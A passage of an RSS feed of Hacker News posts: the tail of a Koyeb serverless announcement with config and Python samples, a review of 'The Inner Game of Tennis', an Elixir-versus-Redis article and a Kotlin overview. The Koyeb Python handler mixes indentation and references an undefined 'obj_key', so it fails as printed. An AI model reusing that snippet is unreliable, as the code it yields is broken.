</code></pre><p>The Koyeb Stacks work in a unified way for containers and code functions. The deployment of containers also integrates with git and lets you benefit from native versioning.</p><p>The Koyeb Serverless Engine is completely event-driven, allowing seamless integration with various sources and native autoscaling. The platform not only provides strong integration with events coming from our Object Storage gateway, it also lets you invoke your functions using events respecting the <a target="_blank" rel="noopener" href="https://cloudevents.io/">CloudEvent specification</a>.</p><p>The event system is designed to be powerful with <strong>easy filtering of incoming events using the Common Expression Language</strong>. Here is a simple example, triggering a container dumping the incoming event with <span><code><span>jq</span></code></span> each time an event is received on the Koyeb Object Storage gateway:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: display-koyeb-event
<span>3</span>    image: stedolan/jq
<span>4</span>    args: [".", "/koyeb/events/in/raw"]
<span>5</span>    events:
<span>6</span>      - cloudevent:
<span>7</span>          expression: event.source == "koyeb.com/gateway"
</code></pre><p>One of the most challenging parts of serverless technologies is troubleshooting. We decided to provide <strong>essential observability features and event tracing as part of the core platform</strong>. All stacks have an audit log with all the events received and which function they triggered. The event content is highly accessible, so you can easily understand your functions' executions and failures.</p><p>As events are the foundation of our connected world, we're exploring use-cases in the IoT space. If you want to talk about events or IoT, please <a target="_blank" rel="noopener" href="http://koyeb.com/contact">contact us</a>!</p><p><a target="_blank" rel="noopener" href="https://www.koyeb.com/docs/stacks/quickstart/bind-store-events">Read more about events in our documentation</a>.</p><p>As part of the Koyeb Platform, we provide an S3-Compliant Object Storage API to store your data. You can use a Koyeb Managed Store or connect your own account cloud service provider. We're happy to share that we already support major cloud service providers including <strong>GCP Storage and AWS S3</strong>.</p><p>We also have an impressive list of cloud service providers in preview: <strong>Azure Blob, Wasabi Storage, Backblaze B2, DigitalOcean Spaces, StackPath Object Storage, and Scaleway Object Storage</strong>.</p><p><strong>Our Serverless Compute Engine is designed to seamlessly integrate with our Object Storage API</strong>. You can easily interact with your Stores from your Koyeb Stack functions and access your data with no effort.</p><p>When you do so, each function execution will get <strong>short-lived credentials</strong> in the environment to access your data store and <strong>prevent credentials leakage</strong>.</p><p>Here is an example of a function using the stores with our secret management engine to fetch the content of an object. The object to fetch and bucket location are automatically provided in the incoming event:</p><pre><code><span>1</span><span>import boto3
</span><span>2</span>import os
<span>3</span>
<span>4</span>def handler(event, context):
<span>5</span>        obj_name = event["object"]["key"]
<span>6</span>        store_name = event["bucket"]["name"]
<span>7</span>        boto_session = boto3.Session(region_name=os.environ[f"KOYEB_STORE_{store_name}_REGION"])
<span>8</span>    store_client = boto_session.resource(
<span>9</span>        "s3",
<span>10</span>        aws_access_key_id=os.environ[f"KOYEB_STORE_{store_name}_ACCESS_KEY"],
<span>11</span>        aws_secret_access_key=os.environ[f"KOYEB_STORE_{store_name}_SECRET_KEY"],
<span>12</span>        endpoint_url=os.environ[f"KOYEB_STORE_{store_name}_ENDPOINT"],
<span>13</span>    )
<span>14</span>    obj = store_client.Object(obj_key).get()
<span>15</span>    content = obj["Body"].read()
<span>16</span>    # Add your own processing logic!
</code></pre><p>Our S3-Compliant object storage API can now also be used as a <strong>standalone solution to benefit from a unified API wherever your data is stored</strong>.</p><p>One of the core benefits of the Koyeb serverless engine is that <strong>autoscaling and high-availability are provided by design</strong>.</p><p>On the availability side, you don't need to worry about dealing with failures of the underlying infrastructure, we take care of <strong>automatically provisioning your functions on a new server in case of a failure</strong>.</p><p>On the scaling side, we <strong>automatically increase the number of containers according to the number of incoming events</strong>. Free accounts have a default scaling limit at 10 to prevent abuse, <a target="_blank" rel="noopener" href="https://app.koyeb.com/support">contact us</a> if you need to scale more!</p><p>Our function catalog has been completely refreshed with <strong>ready-to-use integrations which are now completely open-source</strong>: <a target="_blank" rel="noopener" href="http://github.com/koyeb-community">github.com/koyeb-community</a>.</p><p>It's easy to combine ready-to-use functions with your own code in Stacks. For instance, to to use the <a target="_blank" rel="noopener" href="http://koyeb.com/catalog/function/image-resize">image-resize function from the catalog</a>, simply add to your <span><code><span>koyeb.yaml</span></code></span>:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: image-resize
<span>3</span>    use: image-resize@1.0.0
<span>4</span>    with:
<span>5</span>      STORE: your-store
<span>6</span>      IMAGE_RESIZE_WIDTH: 150
</code></pre><p>All catalog functions can be easily forked, modified to your needs and deployed thanks to the GitHub integration.</p><p>This post extensively covers all of the platform's new features. If you want to read about complete examples, head to our new <a target="_blank" rel="noopener" href="http://koyeb.com/tutorials">tutorials section</a> where we cover complete end-to-end use-cases:</p><ul><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/image-search-app-with-koyeb-aws-rekognition-and-algolia">How to build an application with automatic labeling and indexation of medias using Koyeb, AWS Rekognition and Algolia</a></li><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/watermark-images-uploaded-to-your-backblaze-b2-bucket-automatically">How to automatically watermark images uploaded to a Backblaze B2 bucket</a></li><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/process-digitalocean-spaces-bucket-images-to-generate-thumbnail">How to process DigitalOcean Spaces images to generate thumbnails</a></li></ul><p>Some of you already spotted some of the new features under development in our documentation: cron to schedule recurring jobs, HTTP event sources, and our CLI are all under construction and scheduled for a release in the coming weeks!</p><p><strong>We're happy to provide 1000 hours of compute, 1TB of storage, and 5TB of bandwidth per month for free until the end of the year! <a target="_blank" rel="noopener" href="https://app.koyeb.com/auth/signup">Sign up now</a> ;)</strong></p><p>As always, we're available through our <a target="_blank" rel="noopener" href="https://app.koyeb.com/support"><strong>support channel</strong></a>, <a target="_blank" rel="noopener" href="https://slack.koyeb.com/"><strong>Slack</strong></a> or through our integrated instant messaging system if you have a question or want to share feedback.</p><p>We'…</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions">http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions</a></em></p>]]>
            </description>
            <link>http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070416</guid>
            <pubDate>Thu, 12 Nov 2020 14:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zen and Tennis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070242">thread link</a>) | @adamfaliq
<br/>
November 12, 2020 | https://adamfaliq.com/2020/11/12/zen-tennis/ | <a href="https://web.archive.org/web/*/https://adamfaliq.com/2020/11/12/zen-tennis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-275">
	<!-- .entry-header -->

	<div>
		
<div><figure><a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f"><img loading="lazy" data-attachment-id="277" data-permalink="https://adamfaliq.com/tennis/" data-orig-file="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg" data-orig-size="323,499" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="tennis" data-image-description="" data-medium-file="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=194" data-large-file="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=323" src="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=323" alt="" width="242" height="374" srcset="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=242 242w, https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=97 97w, https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=194 194w, https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg 323w" sizes="(max-width: 242px) 100vw, 242px"></a></figure></div>



<p>This article reviews <em><a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f">The Inner Game of Tennis</a></em> and outlines actionable insights from the book.</p>



<p>In <em><a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f">The Inner Game of Tennis</a></em>, <a href="https://theinnergame.com/">Gallwey</a> shows the methods to overcome self-doubt, nervousness and lapses of concentration that can keep a player from winning. These challenges are called the ‘inner game’. The inner game is the game that takes place in the mind of the player and is played against inner obstacles. In contrast, the outer game is played against an external opponent to overcome external obstacles to reach an external goal.</p>



<p>A player wins the inner game when he can cultivate a spontaneous performance. The player then performs with a true self-confidence – calm and not trying too hard. The player’s mind is one with the body and he can surpass his limits.</p>



<p>There are three steps to develop one’s inner game: (1) learning to let go of judgements, (2) learning to trust yourself and (3) learning to program yourself with images rather than instructing with words.</p>



<p><strong>Let Go of Judgements</strong></p>



<p>The first step is to let go of judgements. Judgement is the self-imposed sense of “goodness” or “badness” that the player ascribes to the events that happen. A judgemental person is one who assigns a negative or a positive value to an event. The person is saying that some events are good, and he likes them, or they are bad, and he hates them.</p>



<p>Self-judgements become self-fulfilling prophecies. When a person judges himself, his inner self will act accordingly. He will begin to live according to these expectations. These expectations will perpetuate in his life until his mind establish a self-identity according to these.</p>



<p>In tennis, self-judgements also lead to emotional reactions and physical tightness, trying too hard and self-condemnation.</p>



<p>A person overcomes his judgement by seeing, feeling and being aware of what is. In tennis, the player does not have to think where the ball is, he simply sees it. He feels where the ball is and is aware of its movement. The player acknowledges his strengths, weaknesses, efforts and accomplishments.</p>



<p><strong>Trusting Yourself</strong></p>



<p>The second step is trusting yourself. What does it mean to trust yourself? Trusting yourself is not positive-thinking or overconfidence, convincing yourself to hit an ace in every serve. In the inner game, trusting yourself means to let your body hits the ball. The keyword is ‘let’. The player trusts in the competence of his body and mind, allowing himself to swing the racket.</p>



<p>Similar to self-judgement, not trusting yourself causes both mental and physical interference. These interferences result in physical tightness, mental distraction and lack of concentration.</p>



<p>A player who already knows how to swing the racket should trust his body to do it. A player who does not, should learn it. As he practices, his mind stores, refines and extends this movement in his memory. The mind remembers every action and the results of every action. The player should allow the natural learning process to take place and forget about the stroke-by-stroke instruction, similar to a baby learning how to walk.</p>



<p><strong>Using Imagery</strong></p>



<p>The last step is to program your mind using imagery, rather than words. Imagery is the mind’s native language. Using sensory images, you can hold the desired outcome that you want to achieve and let your body does the work.</p>



<p>To use the imagery technique, hold your desired results or form in your mind and allow the body to do what is necessary. The player must trust his body, refraining from giving itself instruction and from exerting controlled effort. The author stresses that it is important not to make any conscious effort when performing the action.</p>



<p><em><a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f">The Inner Game of Tennis</a></em> demonstrates than winning in sports and life have both inner and outer game aspects. Overcoming the inner obstacles will allow a player to improve his skills continuously. However, this does not mean that the player should not practice his outer game. The book also dedicates a section to practice and perfect a player’s tennis technique.</p>



<p>Nonetheless, knowing these techniques is only the first step in winning any game. Only constant practise and hard work will help us to overcome any obstacle that life throws at us.</p>



<p>Click here to visit the <a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f">Amazon book page</a> (affiliate link), where it is available in multiple formats.</p>



<p>Like this post? Write a comment below and let me know what you think!</p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->

		<!-- .entry-auhtor -->
</article></div>]]>
            </description>
            <link>https://adamfaliq.com/2020/11/12/zen-tennis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070242</guid>
            <pubDate>Thu, 12 Nov 2020 14:31:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You may not need Redis with Elixir]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070203">thread link</a>) | @rkangel
<br/>
November 12, 2020 | https://dashbit.co/blog/you-may-not-need-redis-with-elixir | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/you-may-not-need-redis-with-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> November 11th, 2020
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/redis">redis</a>, <a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/pubsub">pubsub</a>, <a href="https://dashbit.co/blog/tags/processes">processes</a>
  </li>
</ul>
<p>
If you have participated in a discussion about Elixir, you may have heard “you may not need Redis with Elixir”. Given that Redis has many use cases, this sentence may confuse developers as they try to match Elixir’s different features against Redis’ capabilities. This article aims to explore different scenarios where the above is true, when they are not, and which trade-offs you may want to consider. We will discuss four cases:</p>
<ol>
  <li>
<a href="#post-pubsub">Distributed PubSub</a>  </li>
  <li>
<a href="#post-presence">Presence</a>  </li>
  <li>
<a href="#post-caching">Caching</a>  </li>
  <li>
<a href="#post-async">Asynchronous processing</a>  </li>
</ol>
<p>
Before we start, I want to emphasize we find Redis a fantastic piece of technology. This is not a critique of Redis but rather a discussion of the different options Elixir developers may have available.</p>
<h2 id="post-pubsub">
  Case #1: Distributed PubSub</h2>
<p>
The first scenario where you may not need Redis with Elixir is Distributed <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">PubSub</a>. Throughout this section, we will consider PubSub systems to provide <strong>at-most-once delivery</strong>: they broadcast events to the currently available subscribers. If a subscriber is not around, they won’t receive the message later.</p>
<p>
For this reason, PubSub systems are often paired with databases to offer persistence. For example, every time someone sends a message in a chat application, the system can save the contents to the database and then broadcast it to all users. This means everyone connected at a given moment sees the update immediately, but disconnected users can catch up later.</p>
<p>
Imagine that you have multiple nodes, and you want to exchange messages between said nodes. In Elixir, thanks to the Erlang VM, which ships with distribution support, this can be as simple as:</p>
<pre><code><span>for</span><span> </span><span>node</span><span> </span><span>&lt;-</span><span> </span><span>Node</span><span>.</span><span>list</span><span data-group-id="8737372369-1">(</span><span data-group-id="8737372369-1">)</span><span> </span><span data-group-id="8737372369-2">do</span><span>
  </span><span>send</span><span data-group-id="8737372369-3">(</span><span data-group-id="8737372369-4">{</span><span>:known_name</span><span>,</span><span> </span><span>node</span><span data-group-id="8737372369-4">}</span><span>,</span><span> </span><span>:hello_world</span><span data-group-id="8737372369-3">)</span><span>
</span><span data-group-id="8737372369-2">end</span></code></pre>
<p>
In <a href="https://github.com/phoenixframework/phoenix_pubsub/blob/master/lib/phoenix/pubsub.ex">200LOC or less</a>, you can implement a PubSub system that broadcasts to all subscribers within the same node or anywhere else in a cluster, without bringing any third-party tools. At best, you will need <a href="https://github.com/bitwalker/libcluster">libcluster</a> - an Elixir library - to establish the connection between the nodes based on some strategy (K8s, AWS, DNS, etc.).</p>
<p>
In other words, PubSub pretty much ships out of the box with Elixir. Technologies without distribution would need to rely on Redis PubSub, PostgreSQL Notifications, or similar to achieve the same.</p>
<p>
Of course, the above assumes your infrastructure allows you to directly establish connections between nodes, which may not be possible in some PaaS, such as Heroku. In those cases, you can use any of the technologies above (Phoenix <a href="https://dashbit.co/blog/github.com/phoenixframework/phoenix_pubsub_redis/">has a Redis adapter</a> for its PubSub), or alternatively use platforms, such as <a href="https://www.gigalixir.com/">Gigalixir</a>, that make it trivial to setup a cluster.</p>
<h2 id="post-presence">
  Case #2: Presence</h2>
<p>
Presence is the ability to track who is connected in a cluster right now — the “who” may be users, phones, IoT devices, etc. For example, if Alice is connected to node A, she wants to see that Bob is also available, even if he has joined node B.</p>
<p>
Presence is one of the problems that are more complicated to implement than it sounds. For example, let’s consider implementing Presence by storing the connected entities in a database. However, what happens if a node crashes or leaves the cluster? Because the node crashed, all the users connected to it must be removed, but the node itself cannot do so. Therefore the other nodes need to detect those failure scenarios and act accordingly. But observing failures in a distributed system is also complicated: how do you differentiate between a temporarily unresponsive node from one that permanently failed?</p>
<p>
Another common approach to solve this problem is to frequently write to a database while users are connected. If you have seen no writes within a timeframe, you consider those users to be disconnected. However, such solutions have to choose between being write-intensive or inaccurate. For instance, let’s say that users become disconnected after 1 minute. This means that you need to write to the database every 1 minute for every user. If you have 10k users, that’s 167 writes per second, only to track that the users are connected. Meanwhile, the gap between a user leaving and having their status reflected in the UI is, in the worst-case scenario, also 1 minute. Any attempt at reducing the number of writes implies an increased gap.</p>
<p>
Given Elixir’s clustering support, we can once more implement <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> without a need for third-party dependencies! We use a PubSub system to implement Presence, as we need to notify as users join and leave. Instead of relying on centralized storage, the nodes directly communicate and exchange information about who is around. This removes the need for frequent writes. When a user leaves, this is also reflected immediately.</p>
<p>
So while you can use Redis or another storage to provide Presence, Elixir can deliver a solution that is efficient and doesn’t require third-party tools.</p>
<h2 id="post-caching">
  Case #3: Caching</h2>
<p>
The solutions to previous cases were built on top of Erlang’s unique distribution capabilities. In the following sections, the distinguishing factor between needing Redis or not will be <strong>multi-core concurrency</strong>, so this discussion is more generally applicable. Therefore, when we say Elixir in this section, it will also apply to JVM, Go, and other environments. They will contrast to Ruby, Python, and Node.js, in which their primary runtimes do not provide adequate multi-core concurrency within a single Operating System process.</p>
<p>
Let’s start with the non-concurrent scenario. Consider you are building a web application in Ruby, Python, etc. To deploy it, you get two eight-core machines. In languages that do not provide satisfactory multi-core concurrency, a common option for deployment is to start 8 instances of your web application, one per core, on each node. Overall, you will have CxN instances, where C is the number of cores, and N is the number of nodes.</p>
<p>
Now consider a particular operation in this application that is expensive, and you want to cache its results. The easiest solution, regardless of your programming environment, is to cache it in memory. However, given we have 16 instances of this application, caching it in memory is suboptimal: we will have to perform this expensive operation at least 16 times, one for each instance. For this reason, it is widespread to use Redis, Memcached, or similar for caching in environments like Ruby, Python, etc. With Redis, you would cache it only once, and it will be shared across all instances. The trade-off is that we are replacing memory access by a network round-trip, and the latter is orders of magnitude more expensive.</p>
<p>
Now let’s consider environments with multi-core concurrency. In languages like Elixir, you start one instance per node, regardless of the number of cores, since the runtime will share memory and efficiently spread the work across all cores. When it comes to caching, keeping the cache in-memory is a much more affordable scenario, as you will only have to compute once per node. Therefore, you have the <em>option</em> to skip Redis or Memcached altogether and avoid network round-trip.</p>
<p>
Of course, this depends on how many nodes you are effectively running in production. Luckily, many companies report being able to <a href="https://dev.to/erlangsolutions/why-elixir-is-the-programming-language-you-should-learn-in-2020-5g00">run Elixir with an order of magnitude less nodes</a> than technologies they have migrated from.</p>
<p>
You can also choose a mixed approach and store the cache both in-memory and in Redis. First, you look up in memory and, if missing, you fallback to Redis. If unavailable in both, then you execute the operation and cache it in each. The critical part to highlight here is that multi-core environments give you more flexibility to tackle these problems while reducing resource utilization. In Elixir/Erlang, you can also keep the cache in memory and use PubSub to distribute it across nodes. You can see this last approach in action <a href="https://github.com/tompave/fun_with_flags">in the excellent FunWithFlags library</a>.</p>
<p>
Another trade-off to consider is that all in-memory cache will be gone once you deploy new nodes. Therefore, if you need data to persist across deployments, you will want to use Redis as a cache layer, as detailed above, or dump the cache in a storage, such as database, S3, or Redis, before each deployment.</p>
<h2 id="post-async">
  Case #4: Asynchronous processing</h2>
<p>
Another scenario you may not need Redis in Elixir is to perform asynchronous processing. Let’s continue the discussion from the previous case.</p>
<p>
In environments without or with limited multi-core concurrency, given each instance is assigned to one core, they are limited in their ability to handle requests concurrently. This has led to a common saying that “you should avoid blocking the main thread”. For example, imagine that your application has to deliver emails on sign up or generate some computationally expensive reports. While one of your 16 web instances is doing this, it cannot handle other incoming requests efficiently. For this reason, a common choice here is to move the work elsewhere, typically a background-job processing queue. First, you store the work to be done on Redis or similar. Then one of the 16 web instances (or more commonly a completely different set of workers) grabs it from the queue.</p>
<p>
In multi-core concurrent environments, requests can be handled concurrently regardless if they are doing CPU or IO work. Sending the email from the request itself won’t block other requests. Generating the report is not a problem, as requests can be served by other CPUs. These platforms typically get assigned as many requests as they can handle and they distribute the work over the machine resources. Even if you prefer to deliver emails outside of the request, in order to send an earlier response to users, you can spawn an asynchronous worker without a need to move the delivery to an external queue or to another machine. Once again, concurrency gives us a more straightforward option to tackle these scenarios.</p>
<p>
Note the Erlang VM takes care of multiplexing CPU and IO work without a need for developers to tag functions as async or similar. Workers in Erlang/Elixir are …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/you-may-not-need-redis-with-elixir">https://dashbit.co/blog/you-may-not-need-redis-with-elixir</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/you-may-not-need-redis-with-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070203</guid>
            <pubDate>Thu, 12 Nov 2020 14:27:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kotlin is known in Android environment, but it also performs well in other areas]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070191">thread link</a>) | @Pabloemm
<br/>
November 12, 2020 | https://solidstudio.io/blog/what-is-kotlin-used-for.html | <a href="https://web.archive.org/web/*/https://solidstudio.io/blog/what-is-kotlin-used-for.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <p>While not as revolutionary as some other programming languages, <a href="https://solidstudio.io/technologies/kotlin.html">Kotlin</a> has been steadily growing in popularity over the past couple of years.</p>
                <p><img src="https://solidstudio.io/img/blog/what-is-kotlin-used-for/kotlin-popularity.png" alt="Kotlin popularity graph"></p><p>The initial spike on May 17, 2017, was caused by the Google Android team <a href="https://blog.jetbrains.com/kotlin/2017/05/kotlin-on-android-now-official/" rel="nofollow">officially announcing</a> first-class support for Kotlin.</p>
                
                <h2>Android development</h2>
                <p>Of course, this shouldn’t be at all surprising that the majority of Kotlin development is done for <a href="https://solidstudio.io/blog/android-development-starter-pack.html">Android mobile apps</a>. Official docs encourage Kotlin usage and most SDK docs offer snippets of code in Kotlin making it very easy to get started. Growing popularity on StackOverflow means that it’s sometimes easier to find the answer to your question in Kotlin than in Java.</p>
                <p>Many big companies already switched their development to Kotlin and are amazed by the results. Big names on this list include Google and JetBrains themselves, Amazon, Netflix, Coursera and, Uber, but many smaller companies are also making the switch.</p>
                <p>See more:</p>
                <ul>
                <li><a href="https://developer.android.com/kotlin" rel="nofollow">https://developer.android.com/kotlin</a></li>
                <li><a href="https://firebase.google.com/docs/firestore/query-data/get-data#kotlin+ktx" rel="nofollow">                https://firebase.google.com/docs/firestore/query-data/get-data#kotlin+ktx</a></li>
                <li><a href="https://developer.android.com/kotlin/stories" rel="nofollow">https://developer.android.com/kotlin/stories</a></li>
                <li><a href="https://medium.com/@daveford/who-is-using-kotlin-84b11b4fb51a" rel="nofollow">https://medium.com/@daveford/who-is-using-kotlin-84b11b4fb51a</a></li>
                </ul>
                
                <h2>Cross-platform shared logic</h2>
                <p>Android development is not the only thing we can do in Kotlin though. By leveraging Kotlin Multiplatform Mobile capabilities we can create a re-usable domain logic code that can be shared between mobile apps on Android and iOS. Even though this project is still in the alpha phase, some big companies are already experimenting with this technology and the results are promising. The premise of sharing business logic between multiple platforms is very appealing both in terms of development speed as well as maintenance costs. This was clearly visible in the recent shift towards cross-platform frameworks like React Native or Flutter, but it should soon be possible to <a href="https://netflixtechblog.com/netflix-android-and-ios-studio-apps-kotlin-multiplatform-d6d4d8d25d23" rel="nofollow">do the same with Kotlin</a>.</p>
                <p>See more:</p>
                <ul>
                <li><a href="https://kotlinlang.org/lp/mobile/" rel="nofollow">https://kotlinlang.org/lp/mobile/</a></li>
                <li><a href="https://blog.jetbrains.com/kotlin/2020/08/kotlin-multiplatform-mobile-goes-alpha/" rel="nofollow">https://blog.jetbrains.com/kotlin/2020/08/kotlin-multiplatform-mobile-goes-alpha/</a></li>
                </ul>
                
                <h2>Web development</h2>
                <p>Web development is basically all JavaScript, but that does not mean other languages cannot be used for this purpose. Languages like Typescript, Elm, Clojurescript, or ReasonML are all used in Web development by transpiling them back to JavaScript. Using Kotlin/JS we can do the same with Kotlin! If you don’t want to abandon your current knowledge about React, Redux, React Router, or even styled-components, take a look at the kotlin-wrappers repository which provides wrappers for all those libraries and more.</p>
                <p>Kotlin/JS gives you all the benefits of Kotlin while still allowing you to interact with DOM or use npm packages directly inside Kotlin code.</p>
                <p>Remember Kotlin Multiplatform? It works for Kotlin/JS as well, which means the business logic can be shared between Android, iOS AND web version of your app!</p>
                <p>See more:</p>
                <ul>
                <li><a href="https://kotlinlang.org/docs/reference/js-overview.html" rel="nofollow">https://kotlinlang.org/docs/reference/js-overview.html</a></li>
                <li><a href="https://kotlinlang.org/docs/tutorials/javascript/setting-up.html" rel="nofollow">https://kotlinlang.org/docs/tutorials/javascript/setting-up.html</a></li>
                </ul>

                <h2>Backend development</h2>
                <p>By this point, you may be thinking that Kotlin is perfect for front-end parts. Turns out it is pretty nice on the backend side as well. If you’re already familiar with the usual <a href="https://solidstudio.io/technologies/java.html">Java</a> backend stack which uses Spring Boot it is very easy to make the switch to Kotlin and it’s now easier than ever to write Kotlin-idiomatic code in Spring Boot.</p>
                <p>If you’re searching for a lightweight server-side framework in Kotlin, <a href="https://ktor.io/" rel="nofollow">ktor</a> is gaining more and more traction within the community.</p>
                <p>Going all-in on Kotlin? By using multiplatform capabilities, one can easily create a full-stack application and share business logic between all frontends and backend (for things like validation logic, shared models, etc)</p>
                <p>See more:</p>
                <ul>
                <li><a href="https://spring.io/guides/tutorials/spring-boot-kotlin/" rel="nofollow">https://spring.io/guides/tutorials/spring-boot-kotlin/</a></li>
                <li><a href="https://blog.jetbrains.com/kotlin/2020/08/the-state-of-kotlin-support-in-spring/" rel="nofollow">https://blog.jetbrains.com/kotlin/2020/08/the-state-of-kotlin-support-in-spring/</a></li>
                <li><a href="https://github.com/Kotlin/kotlin-full-stack-application-demo" rel="nofollow">https://github.com/Kotlin/kotlin-full-stack-application-demo</a></li>
                </ul>
                
                <h2>Kotlin native</h2>
                <p>Sometimes we cannot, or don’t want to, use a virtual machine (JVM), for example when targeting embedded devices. That’s where Kotlin/Native comes into play.</p> 
                <p>Not only can it produce native Windows, Linux or MacOS binaries but it can even support iOS, watchOS, tvOS, and WebAssembly. It is easy to include compiled Kotlin code directly in an existing C/C++ project as well as call native code directly from Kotlin/Native.</p> 
                <p>See more:</p>
                <ul>
                <li><a href="https://kotlinlang.org/docs/reference/native-overview.html" rel="nofollow">https://kotlinlang.org/docs/reference/native-overview.html</a></li>
                <li><a href="https://www.bignerdranch.com/blog/exploring-kotlin-native-part-1/" rel="nofollow">https://www.bignerdranch.com/blog/exploring-kotlin-native-part-1/</a></li>
                </ul>
                
                <h2>Data science</h2>
                <p>Although Python is still very much dominating the data science scene, Kotlin is making its appearance here as well. If you want to leverage JVM capabilities and performance while writing concise, statically typed and null-safe code, Kotlin may be a perfect fit for you. Afraid of losing your favorite tooling? Don’t be! Kotlin kernel for Jupyter Notebook and Kotlin interpreter for Apache Zeppelin will let you do the exploratory research and data visualization within those interactive editors. Want to jump straight into deep learning? Being fully interoperation with Java libraries, Kotlin can integrate seamlessly with existing open-source projects like <a href="https://deeplearning4j.org/" rel="nofollow">https://deeplearning4j.org/</a></p>
                <p>See more:</p>
                <ul>
                <li><a href="https://kotlinlang.org/docs/reference/data-science-overview.html" rel="nofollow">https://kotlinlang.org/docs/reference/data-science-overview.html</a></li>
                <li><a href="https://github.com/Kotlin/kotlin-jupyter" rel="nofollow">https://github.com/Kotlin/kotlin-jupyter</a></li>
                </ul>
                
                <h2>Final thoughts</h2>
                <p>As we can see, Kotlin can be used for a wide variety of subjects, starting with Android development and ending among native binaries. Be aware, as some of those technologies like Kotlin Multiplatform and Kotlin/Native are still quite new and can be rough around the edges, but this wide spectrum of Kotlin capabilities shows that there is a real interest in such a versatile programming language. Both the team behind Kotlin and the community are working very hard to make this vision a reality.</p>
                <p>Since it is very easy to integrate Kotlin with Java, if you already have a Java project (maybe an Android app or a backend service), don’t be afraid to give Kotlin a try. Who knows, maybe this time it will save you from the <a href="https://en.wikipedia.org/wiki/Null_pointer#History" rel="nofollow">billion-dollar mistake</a>?</p>
                <p>Not convinced? Feel free to reach out, and we will help you make the switch to Kotlin.</p>
                
                
                
            </div></div>]]>
            </description>
            <link>https://solidstudio.io/blog/what-is-kotlin-used-for.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070191</guid>
            <pubDate>Thu, 12 Nov 2020 14:27:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build an AI-Powered Snapchat Lens to Classify Between Objects]]>
            </title>
            <description>
<![CDATA[
